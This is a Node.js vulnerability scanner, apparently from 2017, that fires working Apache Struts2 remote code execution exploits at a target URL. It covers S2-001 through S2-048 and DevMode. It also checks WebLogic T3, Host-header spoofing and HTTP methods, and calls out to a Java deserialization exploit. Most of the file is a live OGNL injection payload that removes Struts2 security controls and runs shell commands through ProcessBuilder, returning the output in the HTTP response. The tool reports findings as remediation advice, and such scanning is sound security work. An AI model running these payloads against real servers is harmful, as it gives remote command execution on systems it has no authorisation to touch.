var szMyName = 'M.T.X._2017-06-08 1.0',
	program     = require('commander'),
	request = require('request'),
	urlObj = require('url'),
	child_process = require("child_process"),
	net = require('net'),
	crypto = require('crypto'),
	path        = require("path"),
	fs = require('fs'),
	g_szUrl = "",bReDo = false, szLstLocation = "",
	g_oRst = {},
	timeout = 5000,
	g_nPool = 100,
	iconv = require("iconv-lite"),
	bRunHost = false,
	g_szUa = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
	g_szCmd = "echo whoami:;whoami;echo pwd:;pwd;echo cmdend",
	g_szCmdW = "echo whoami: && whoami && echo pwd: && echo %cd% && echo cmdend", // && dir
	aHS = "content-type,Strict-Transport-Security,Public-Key-Pins,Content-Security-Policy,X-Permitted-Cross-Domain-Policies,Referrer-Policy,X-Content-Security-Policy,x-frame-options,X-Webkit-CSP,X-XSS-Protection,X-Download-Options".toLowerCase().split(/[,]/),
	g_postData = "%{(#nike='multipart/form-data')"
		// s-045不允许下面的代码
		// + ".(#_memberAccess['allowStaticMethodAccess']=true)"
		// + ".(#_memberAccess['acceptProperties']=true)"
		// + ".(#_memberAccess['excludedPackageNamePatterns']=true)"
		// + ".(#_memberAccess['excludedPackageNamePatterns']=true)"
		// + ".(#_memberAccess['excludedClasses']=true)"
		+ ".(#rplc=true)"
		+ ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" 
		+ ".(#_memberAccess?(#_memberAccess=#dm):" 
		+ "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])" 
		+ ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
		+ ".(#ognlUtil.getExcludedPackageNames().clear())"
		+ ".(#ognlUtil.getExcludedClasses().clear())"
		+ ".(#context.setMemberAccess(#dm))))"
		+ ".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))"
		+ ".(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'}))"
		+ ".(#p=new java.lang.ProcessBuilder(#cmds))"
		+ ".(#p.redirectErrorStream(true)).(#process=#p.start())"
		+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"

	    // 我添加的当前位置行加上后，会无法输出
	    // + ".(#ros.write(@org.apache.struts2.ServletActionContext@getRequest().getServletContext().getRealPath('.').getBytes()))"
		// + ".(@org.apache.commons.io.IOUtils@copy(new java.io.InputStreamReader(#process.getInputStream(),#iswin?'gbk':'UTF-8'),#ros))"
		 + ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))"
		+ ".(#ros.flush()).(#ros.close())}"
		;


process.stdin.setEncoding('utf8');
process.env.NODE_ENV = "production";

program.version(szMyName)
	.option('-u, --url [value]', 'check url, no default')
	.option('-p, --proxy [value]', 'http proxy,eg: http://127.0.0.1:8080, or https://127.0.0.1:8080, no default')
	.option('-t, --t3', 'check weblogic t3,default false')
	.option('-i, --install', 'install node modules')
	.option('-v, --verbose', 'show logs')
	.option('-o, --timeout', 'default ' + timeout)
	.option('-l, --pool', 'default ' + g_nPool)
	.option('-m, --menu [value]', 'scan url + menus, default ./urls/ta3menu.txt')
	.option('-s, --webshell [value]', 'scan webshell url，设置参数才会运行, default ./urls/webshell.txt')
	.option('-d, --method [value]', 'default PUT,DELETE,OPTIONS,HEAD,PATCH test')
	.option('-a, --host ', 'host attack test,设置代理后该项功能可能无法使用,default true')
	.option('-k, --keys [value]', 'scan html keywords, default ./urls/keywords')
	.parse(process.argv);
timeout = program.timeout || timeout;
g_nPool = program.pool || g_nPool;

// 检查对象
var a = process.argv.splice(2)
g_szUrl = program.url || 1 == a.length && a[0];
if(!/[\?;!&]/.test(g_szUrl) && '/' != g_szUrl.substr(-1))
	g_szUrl += "/";
// 安装包
if(program.install)
{
	var aI,szT = fs.readFileSync(__filename),r1 = /^(net|commander|fs|child_process)$/gmi,
		r2 = /require\(['"]([^'"]+)['"]\)/gmi;
	while(aI = r2.exec(szT))
	{
		if(r1.exec(aI[1]))continue;
		// console.log(r1.exec(aI[1]));
		console.log("start install %s to global",aI[1]);
		console.log(child_process.execSync("npm install -g " + aI[1]).toString());
	}
	process.exit(0);
}

// 代理设置
if(program.proxy)
{
	request = request.defaults({'proxy': program.proxy});
	var a1 = program.proxy.split(/:\/\//g)
	if(a1 && 2 == a1.length)
	{
		process.env[a1[0].toLowerCase() + "_proxy"] = program.proxy;
		try{require('global-tunnel').initialize()}catch(e){}
	}
}
function fnOptHeader(o)
{
	var k = {followAllRedirects:false,followRedirect:false,"timeout":timeout,pool: {maxSockets: g_nPool}};
	for(var i  in k)
	{
		o[i] = k[i];
	}
	return o;
}

// tomcat测试
// https://www.exploit-db.com/exploits/41783/
// /?{{%25}}cake\=1
// /?a'a%5c'b%22c%3e%3f%3e%25%7d%7d%25%25%3ec%3c[[%3f$%7b%7b%25%7d%7dcake%5c=1
// 基于socket发送数据
function fnSocket(h,p,szSend,fnCbk)
{
	const client = net.connect(fnOptHeader({"port": p,"host":h}), () => 
	{
	  client.write(szSend);
	});
	client.on('data', (data) => 
	{
		fnCbk(data);
		client.end();
	});
	client.on('end', () =>{});
}

// check weblogic T3
function checkWeblogicT3(h,p)
{
	var s  = "t3 12.1.2\nAS:2048\nHL:19\n\n";
	p || (p = 80);
	fnLog(s);
	fnSocket(h,p,s,function(data)
	{
		if(data)
		g_oRst.t3 = {r:data.toString().trim(),des:"建议关闭T3协议，或者限定特定ip可访问"};
		fnLog(g_oRst.t3.r);
		/*
		var d = data && data.toString().trim() || "", 
			re = /^HELO:(\d+\.\d+\.\d+\.\d+)\./gm;
		console.log(d);
		console.log(re.test(d));*/
	});
}
// checkWeblogicT3("192.168.18.89",7001);
if(program.t3)
{
	var r1 = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):?(\d+)?/gmi.exec(g_szUrl);
	checkWeblogicT3(r1[1],r1[2]);
}

// 解析裸头信息
function fnParseHttpHd(s,fnCbk)
{
	var a = s.trim().split(/\n/), obj = {"statusCode":a[0].split(/ /)[1]};
	// if(!(/^\d+$/.test(obj.statusCode))) obj['body'] = s.trim().replace(/[\r\n\t]/gmi, "").replace(/>\s*</gmi, "><");

	for(var i in a)
	{
		// if(0 == i)continue;
		var x = a[i].indexOf(":");
		var aT = [a[i].substr(0, x), a[i].substr(x + 1)];
		
		if(aT[0])
			obj[aT[0].toLowerCase().trim()] = aT[1].trim();
	}
	if(fnCbk)fnCbk(obj);
}

// 伪造host攻击测试
function fnDoHostAttack(url,fnCbk)
{
	if(bRunHost)return;
	bRunHost = true;
	try{
		var uO = urlObj.parse(url), ss = "I.am.summer.M.T.X.T",host = uO.host.split(/:/)[0], port = uO.port || 80;
		if(/.*?\/$/g.test(uO.path))uO.path = uO.path.substr(0, uO.path.length - 1);
		// checkWeblogicT3(host,port);
		fnCheckJavaFx([host,port].join(":"));
		fnSocket(host,port,'POST ' + uO.path + ' HTTP/1.1\r\nHost:' 
			+ ss + '\r\nUser-Agent:Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like ' 
				+ szMyName 
				+ ') ' + g_szUa + ' MTX/3.0\r\nContent-Type: application/x-www-form-urlencoded' 
		+ '\r\n\r\n',
			function(data)
		{
			var d = data && data.toString().trim() || "";
			
			fnParseHttpHd(d,function(o)
			{
				var oD = {des:"伪造host攻击测试成功"};
				if(o.location && -1 < String(o.location).indexOf(ss))
				{
					g_oRst["host"] = oD;
					oD.des += ", response返回的location：" + o.location;
				}
				var n = d.indexOf(ss);
				if(-1 < n)
				{
					var rg = new RegExp("(<.*?http:\\/\\/" + ss + ".*?>)","gim");
					var a = rg.exec(d);
					if(a)
					{
						var o = g_oRst["host"] || oD;
						o.code = "返回的代码中存在攻击后的代码:" + a[1];
						g_oRst["host"] = o;
					}
				}
			});
		});
	}catch(e){console.log(e);}
}

// 单个方法测试
function fnTest(s)
{
	request(
	    fnOptHeader({ method: s ||'PUT'
	    ,"uri": g_szUrl//.substr(0,url.lastIndexOf("/"))
	    ,headers:{'Access-Control-Request-Method':'GET,HEAD,POST,PUT,DELETE,CONNECT,OPTIONS,TRACE,PATCH'}
	    , multipart:'HEAD' == s|| 'OPTIONS' == s? null:
	      [ { 'content-type': 'application/json'
	        ,  body: JSON.stringify({foo: 'bar', _attachments: {'test.jsp': {follows: true, length: 18, 'content_type': 'text/plain' }}})
	        }
	      , { body: 'I am an attachment' }
	      ]
	    })
	  , function (error, response, body) {
	  		if(!response)return;
	      	if(response && -1 <  [201,200].indexOf(response.statusCode))
	      	{
	      		// console.log(response.headers);
	      		g_oRst.method || (g_oRst.method = {});
	      		g_oRst.method[s] = "开启了" + s + "、应该关闭，建议仅允许GET、POST";
	      		if(response.headers['allow'])
	      			g_oRst.method['allow'] = "确定这些都是必要的：" + response.headers['allow'];
	      	}
	      	var a = ["x-powered-by","server"];
	      	for(var k in a)
	      	if(!g_oRst[a[k]] && response && response.headers && response.headers[a[k]])
	      		g_oRst[a[k]] = "应该屏蔽 " + response.headers[a[k]];
	      	if(response && response.headers && response.headers["location"])
	      	{
	      		g_oRst["location"] = "建议在服务器端跳转 " + response.headers["location"];
	      		if(szLstLocation != response.headers["location"])
	      		{
	      			// url
	      			szLstLocation = response.headers["location"];
	      			fnTestAll();
	      		}
	      	}
	      	for(var k in aHS)
	      	{
	      		if(!response.headers[aHS[k]])
	      		{
	      			g_oRst.safeHeader || (g_oRst.safeHeader = {});
	      			g_oRst.safeHeader[aHS[k]] = "确定不需要该安全头信息 " + aHS[k];
	      		}
	      	}
	      	g_oRst.safeHeader.des = "作为安全要求、规范要求，建议加上缺失的头信息";
	    }
	  );
}

function doStruts2_046(url)
{
	request(fnOptHeader({method: 'POST',uri: url,"formData":
		{
			custom_file:
			{
				"value":"xxx",
				"options":
				{
					"filename":encodeURIComponent(g_postData),
					"contentType": "image/jpeg"
				}
			}
		}}),
    	function(e,r,b)
    {
    	fnDoBody(b,"s2-046");
    });
}

// payload = {'method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#parameters.tag[0]),#writer.flush(),#writer.close': '', 'tag': tag}
function doStruts2_032(url)
{
	var oParms = {};
	oParms["method:" + encodeURIComponent(g_postData)] = "";
	oParms["mtxtest"] = "ok";
	request(fnOptHeader({method: 'POST',uri: url,"formData":oParms}),
    	function(e,r,b)
    {
    	fnDoBody(b,"s2-032");
    });
}

// s2-033,s2-037
// s2037_poc = "/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23parameters.content[0]),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=25F9E794323B453885F5181F1B624D0B"
function doStruts2_037(url)
{
	url = url.substr(0, url.lastIndexOf('/') + 1) + encodeURIComponent(g_postData) + ":mtx.toString.json?ok=1";
	request(fnOptHeader({method: 'POST',uri: url}),
    	function(e,r,b)
    {
    	fnDoBody(b,"s2-037");
    });
}
// s2033_poc = "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]%2b602%2b53718),%23wr.close(),xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908"
function doStruts2_033(url)
{
	url = url.substr(0, url.lastIndexOf('/') + 1) + encodeURIComponent(g_postData) + ",mtx.toString.json?ok=1";
	request(fnOptHeader({method: 'POST',uri: url}),
    	function(e,r,b)
    {
    	fnDoBody(b,"s2-037");
    });
}
   

function doStruts2_048(url,fnCbk)
{
	var payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." + 
		"(#_memberAccess?(#_memberAccess=#dm):" + 
		"((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." + 
		"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))" + 
		".(#ognlUtil.getExcludedPackageNames().clear())"+ 
	 	".(#ognlUtil.getExcludedClasses().clear())" + 
		".(#context.setMemberAccess(#dm))))" + 
		".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))" + 
		".(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'}))" + 
		".(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true))" + 
		".(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))" + 
		".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

    // g_postData ||
    var data = {
        "name": g_postData || payload,
        "age": 20
    };
    request(fnOptHeader({method: 'POST',uri: url,"formData":data,"headers":{Referer:url}}),
    	function(e,r,b)
    {
    	fnDoBody(b,"s2-048");
    	// console.log(e || b || r);
    });
}

// /robots.txt

// http://gdsw.lss.gov.cn/swwssb/userRegisterAction.do?redirect:http://webscan.360.cn
// s2_016,s2_017
function doStruts2_016(url)
{
	/*///////////
	var szCode = ("%{(#nike='multipart/form-data')"
		+ ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" 
		+ ".(#_memberAccess?(#_memberAccess=#dm):" 
			+ "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])" 
			+ ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
			+ ".(#ognlUtil.getExcludedPackageNames().clear())"
		+ ".(#ognlUtil.getExcludedClasses().clear())"
		+ ".(#context.setMemberAccess(#dm))))"
		+ ".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))"
		+ ".(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'}))"
		+ ".(#p=new java.lang.ProcessBuilder(#cmds))"
		+ ".(#p.redirectErrorStream(true)).(#process=#p.start())"
		+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse()"
		+ ".getOutputStream()))"
		+ ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))"
		+ ".(#ros.flush()).(#ros.close())}");
	////////////////////////*/
	request(fnOptHeader({method: 'GET',encoding: null,uri: url + "?redirect:" + encodeURIComponent(g_postData)
		}), 
    	function(e,r,b)
    {
    	// console.log(b.toString());
    	// if(-1 < b.indexOf("administrator"))console.log(b.toString("gbk"));
    	if(!e)fnDoBody(b,"s2-016");
    	// console.log(e || b || r);
    });
}

function myLog(a)
{
	// console.log(String(a.callee))
	var c = a.callee.caller;
	// if(c.arguments && c.arguments.caller)console.log(c.arguments.caller)
	if(a.callee.caller)
	{
		console.log(a.callee.caller.arguments);
		a = a.callee.caller.arguments;
		if(0 < a.length)myLog(a);
	}
}
g_oRst.struts2 || (g_oRst.struts2 = {});
function fnDoBody(body,t,rep)
{
	// win 字符集处理
	if(body && -1 < String(body).indexOf("[^\/]administrator"))
	{
		 try{body = iconv.decode(body,"cp936").toString("utf8");}catch(e){}
		 // console.log(body);
	}

	var e = fnGetErrMsg(body);
	if(e)g_oRst.errMsg = e.toString().replace(/<[^>]*>/gmi,'');//.trim();
	// console.log(t);
	var oCa = arguments.callee.caller.arguments;
	if(!rep)rep = oCa[1];
	// error msg
	if(oCa[0])console.log(oCa[0]);
	var repT = oCa[1] || {};
	
	// safegene
	if(repT && repT.headers && repT.headers['safegene_msg'])
		console.log(decodeURIComponent(repT.headers['safegene_msg']));
	// else console.log(repT.statusCode + " " + repT.url)

	body||(body = "");
	if(!body)
	{
		// myLog(arguments);
	}
	if(!body)return;
	body = body.toString("utf8").trim();
	if(-1 < body.indexOf(".opensymphony.xwork2.ActionContext."))return;

	g_oRst.config || (g_oRst.config = {});
	if(!g_oRst.config["server"] && -1 < body.indexOf("at weblogic.work"))
	{
		g_oRst.config["server"] = "配置缺失；信息泄露中间件为weblogic";
	}
	// at 
	if(!g_oRst.config["dev"])
	{
		var re = /Exception\s+at ([^\(]+)\(/gmi;
			re = re.exec(body);
		if(re && 0 < re.length)
		{
			g_oRst.config["dev"] = "配置缺失；信息泄露开发商为:" + re[1];
		}
	}
	if(!g_oRst.config["x-powered-by"] && rep && rep.headers)
	{
		if(rep.headers["x-powered-by"] && -1 < rep.headers["x-powered-by"].indexOf("JSP/"))
		{
			g_oRst.config["x-powered-by"] = "配置缺失；信息泄露实现技术：" + rep.headers["x-powered-by"];
		}
	}
	if(!g_oRst.config["server"] && rep && rep.headers)
	{
		if(rep.headers["server"] && -1 < rep.headers["server"].indexOf("/"))
		{
			g_oRst.config["server"] = "配置缺失；信息泄露实现技术：" + rep.headers["server"];
		}
	}

	if(!body || -1 == body.indexOf("whoami"))return;
	
	if(-1 < t.indexOf("s2-001"))console.log(body)
	var i = body.indexOf("cmdend") || body.indexOf("<!DOCTYPE") || body.indexOf("<html") || body.indexOf("<body");
	// 误报
	if(-1 < body.indexOf("<body"))return;
	console.log("发现高危漏洞：" + t);
	
	if(0 < i) body = body.substr(0, i).trim();
	// console.log(body);
	var oT = g_oRst.struts2,s1 = String(body).split(/\n/);
	oT[t] = "发现struts2高危漏洞" + t + "，请尽快升级";
	if(-1 < body.indexOf("root") && !oT["root"])
		oT["root"] = "中间件不应该用root启动，不符合公司上线检查表要求";
	if(s1[0] && 50 > s1[0].length && !oT["user"])
		oT["user"] = "当前中间件启动的用户：" + (-1 < s1[0].indexOf('whoami')? s1[1]:s1[0]).trim();
	if(1 < s1.length)
		oT["CurDir"] = {des:"当前中间件目录","path":(3 < s1.length ? s1[3] : s1[1]).trim()};
}

function doStruts2_045(url, fnCbk)
{
	// ,"echo ls:;ls;echo pwd:;pwd;echo whoami:;whoami"
	//  && cat #curPath/WEB-INF/jdbc.propertis
	request(fnOptHeader({method: 'POST',uri: url
	    ,headers:
	    {
	    	"User-Agent": g_szUa,
	    	// encodeURIComponent不能编码 2017-07-18
	    	"Content-Type":g_postData
	    }})
	  , function (error, response, body){
	  		if(body)
	  		{
	  			fnDoBody(body,"s2-045");
	  		}
	    }
	  );
}

// S2_DevMode_POC = "?debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=25F9E794323B453885F5181F1B624D0B"
function doStruts2_DevMode(url)
{
	// debug=browser&object=
	// debug=command&expression=
	request(fnOptHeader({method: 'POST',uri: url + "?debug=browser&expression=" + encodeURIComponent(g_postData) + ":xx.toString.json&ok=1"}),
    	function(e,r,b)
    {
    	fnDoBody(b,"s2-DevMode");
    });
}
// s2-007 ' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())) + '


function doStruts2_001(url)
{
	// 如果编码encodeURIComponent 就会导致不执行？
	request(fnOptHeader({method: 'POST',uri: url + "?name=" + (g_postData)}),
    	function(e,r,b)
    {
    	fnDoBody(b,"s2-001,s2-012");
    });
}

//
function doStruts2_019(url, fnCbk)
{
	// ,"echo ls:;ls;echo pwd:;pwd;echo whoami:;whoami"
	//  && cat #curPath/WEB-INF/jdbc.propertis
	request(fnOptHeader({method: 'POST',uri: url,
		"formData":{"debug":"command","expression":encodeURIComponent(g_postData)}
	    ,headers:
	    {
	    	"User-Agent": g_szUa,
	    	"Content-Type":"application/x-www-form-urlencoded"
	    }})
	  , function (error, response, body){
	  		if(body)
	  		{
	  			fnDoBody(body,"s2-019");
	  		}
	    }
	  );
}

function doStruts2_029(url, fnCbk)
{
	// ,"echo ls:;ls;echo pwd:;pwd;echo whoami:;whoami"
	//  && cat #curPath/WEB-INF/jdbc.propertis
	
	var s = 
		// s-045不允许下面的代码
		".(#_memberAccess['allowStaticMethodAccess']=true)"
		+ ".(#_memberAccess['acceptProperties']=true)"
		+ ".(#_memberAccess['excludedPackageNamePatterns']=true)"
		+ ".(#_memberAccess['excludedPackageNamePatterns']=true)"
		+ ".(#_memberAccess['excludedClasses']=true)"
		// s2-048不能加下面的代码
		+ ".(#_memberAccess['allowPrivateAccess']=true)"
		+ ".(#_memberAccess['allowProtectedAccess']=true)"
		+ ".(#_memberAccess['acceptProperties']=true)"
		+ ".(#_memberAccess['allowPackageProtectedAccess']=true)",
		szDPt = g_postData.replace(/\.\(#rplc=true\)/, s);

		

	request(fnOptHeader({method: 'POST',uri: url,
		"formData":{"message":encodeURIComponent(szDPt)}
	    ,headers:
	    {
	    	"User-Agent": g_szUa,
	    	"Content-Type":"application/x-www-form-urlencoded"
	    }})
	  , function (error, response, body){
	  		if(body)
	  		{
	  			fnDoBody(body,"s2-029");
	  		}
	    }
	  );
}

// 测试所有，便于更改url重复测试
function fnTestAll()
{
	if(!program.proxy && false !== program.host)
	fnDoHostAttack(g_szUrl,function(o)
	{
		console.log(o);
	},null);
	var aMethod = (program.method || "PUT,DELETE,OPTIONS,HEAD,PATCH").split(/[,;]/);
	for(var k in aMethod)
		fnTest(aMethod[k]);
}

// 反序列化检测
// java -jar ~/safe/mtx_jfxl/jfxl.jar 192.178.10.1/24:7001
function fnCheckJavaFx(s)
{
	var szF = "~/safe/mtx_jfxl/jfxl.jar";
	child_process.exec("ls " + szF,function(e,so,se)
	{
		if(!so)console.log("mkdir ~/safe && cd ~/safe && git clone https://github.com/hktalent/weblogic_java_des.git");
		else
		{
			szF = "java -jar " + szF + " " + s;
			child_process.exec(szF,function(e,so,se)
			{
				szF = __dirname + "/data/" + s.replace(/:/gmi,"_") + ".txt";
				if(fs.existsSync(szF))
				{
					g_oRst.weblogic_java_des = {des:"发现weblogic【高危】java反序列化漏洞",result:szF};
				}
				if(e)fnLog(e.toString());
			});
		}
	});
	
}
// 缓存正则表达式，便于提高效率
var g_reKeys = null;

function fnCheckKeys(b)
{
	var a,s,r = [],re = /<.*?type=['"]*password['"]*\s[^>]*>/gmi, r1 = /autocomplete=['"]*(off|0|no|false)['"]*/gmi;
	g_oRst.checkKeys || (g_oRst.checkKeys = {});
	var oMp = {}, ss;
	if(!g_oRst.checkKeys.passwordInputs)
	{
		while(a = re.exec(b))
		{
			if(!r1.exec(a[0]))
			{
				ss = a[0].replace(/[\r\n\t"'']/gmi,"").replace(/\s+/gmi," ");
				if(!oMp[ss])
					oMp[ss] = 1,r.push(ss);
			}
		}
		if(0 < r.length)g_oRst.checkKeys.passwordInputs = {"des":"密码字段应该添加autocomplete=off",list:r};
	}
	oMp = {};
	s = program.keys || "./urls/keywords";
	if(!g_oRst.checkKeys.keys && fs.existsSync(s))
	{
		a = g_reKeys || new RegExp("(" + String(fs.readFileSync(s)).trim().replace(/\n/gmi,"|") + ")=","gmi");
		g_reKeys = a;
		re = [];
		while(s = a.exec(b))
		{
			if(!oMp[s[1]])
				oMp[s[1]]=1,re.push(s[1]);
		}
		if(0 < re.length)g_oRst.checkKeys.keys = {"des":"这些关键词在网络中容易被监听，请更换",list:re};
	}
}

var g_reServer = /(Tomcat|JBossWeb|JBoss[\-\/][\d\.]+)/gmi;

// 获取Ta3异常消息
function fnGetErrMsg(body)
{
	if(body)
	{
		body = body.toString();
		fnCheckKeys(body);
		var s1 = "Base._dealdata(", i = body.indexOf(s1);
		if(-1 < i)body = body.substr(i + s1.length);
		s1 = "});";
		i = body.indexOf(s1);
		if(-1 < i)body = body.substr(0, i + 1);
		try
		{
			if(g_reServer)
			{
				var oS = g_reServer.exec(body);
				if(oS && 0 < oS.length && g_oRst.server)g_oRst.server += " " + oS[1],g_reServer = null;
			}
			var o = JSON.parse(body = body.replace(/'/gmi,"\"").replace(/\t/gmi,"\\t\\n").replace(/&nbsp;/gmi," "));
			return o.errorDetail;
		}catch(e)
		{
			var bHv = false;
			i = body.indexOf("at com.");
			if(bHv = -1 < i)body = body.substr(i - 11);
			i = body.lastIndexOf("at ");
			if(-1 < i)bHv = true,body = body.substr(0,i);
			if(bHv)return body;
		}
	}
	return "";
}

// 避免重复处理
var g_HtmlMd5Cf = {};

function fnLog(s)
{
	if(program.verbose)
		console.log(s);
}

// 避免重复,后期可以支持字典目录，多个字典目录，这样可以扫描更多
var g_mUrls = {};
// 检查ta3默认菜单
function fnCheckTa3(u,dict,szDes,type)
{
	var j = u.lastIndexOf('/');
	if(10 < j)u = u.substr(0, j + 1);
	else u += '/';

	fnLog("start check " + dict);
	var s = dict,a,i = 0,fnCbk = function(url)
	{
		fnLog("check " + u + url);
		request(fnOptHeader({method: 'GET',uri: u + url
		    ,headers:
		    {
		    	"User-Agent": g_szUa
		    }
		})
		, function (error, response, body)
		{
			if(!error && body)
			{
				var md5sum = crypto.createHash('md5');
				md5sum.update(body.toString());
				var szMd5 = md5sum.digest('hex');
				if(g_HtmlMd5Cf[szMd5])return;
				g_HtmlMd5Cf[szMd5] = 1;
				// content-length 不同来判断不同值
				// if(!response.headers['content-length'])console.log(body)
				fnDoBody(body,"ta3menus");
				if(200 === response.statusCode)
				{
					var re = /<title>([^<]*)<\/title>/gmi, t = re.exec(body);
					t && (t = t[1].trim());t || (t = "");
					var oTm = (g_oRst[type] || (g_oRst[type] = {}));
					
					oTm.des = szDes + ",这些url响应http 200";
					oTm.urls  || (oTm.urls = []);
					oTm.urls.push([u + url,t].join(","));
				}
			}
		});
	};
	if(fs.existsSync(s))
	{
		a = String(fs.readFileSync(s)).trim().split(/\n/);
		for(; i < a.length; i++)
		{
			if(g_mUrls[a[i]])continue;
			g_mUrls[a[i]] = true;
			// console.log(a[i]);
			fnCbk(a[i]);
		}
	}else fnLog("不存在: " + s);
}
// 全部编码为%xx格式
function fnMakeData(s)
{
	return s.replace(/./gmi,function(a)
	{
		return '%' + String(a).charCodeAt(0).toString(16);
	});
}

// java -jar ~/safe/mtx_jfxl/bin/jfxl.jar 192.168.18.89:7001
/*
// console.log(fnMakeData(g_postData));
request.post(//  + encodeURIComponent(g_postData)
	{
	uri:"http://118.112..108:9289/ypcx/services?fileUpload",
	headers:{'Content-Type':'text/xml;charset=UTF-8'},
	formData:{"k":fnMakeData(fnMakeData(g_postData))}
	}
	,function(e,r)
	{
		if(!e)console.log(r.body);
		console.log(e);
	});
//*/
if(0 < a.length)
{
	//*
	if(program.menu)fnCheckTa3(g_szUrl,program.menu || "./urls/ta3menu.txt","一些常见、可能存在风险url检测",'ta3menu');
	if(program.webshell)fnCheckTa3(g_szUrl,program.webshell || "./urls/webshell.txt", "webshell、木马",'webshell');
	
	doStruts2_001(g_szUrl);
	doStruts2_016(g_szUrl);
	doStruts2_019(g_szUrl);
	doStruts2_029(g_szUrl);
	doStruts2_032(g_szUrl);
	doStruts2_033(g_szUrl);
	doStruts2_037(g_szUrl);
	doStruts2_045(g_szUrl);
	// 文件上传测试
	// doStruts2_046(url);
	doStruts2_048(g_szUrl);
	doStruts2_DevMode(g_szUrl);
	
	// 测试method和伪造host
	fnTestAll();
	////////////////////*/
}


process.on('exit', (code) => 
{
	console.log(JSON.stringify(g_oRst,null,' '));
});

/*
s2-045
node checkUrl.js http://192.168.24.67:22245/
s2-048
node checkUrl.js http://192.168.24.67:22244/integration/saveGangster.action
*/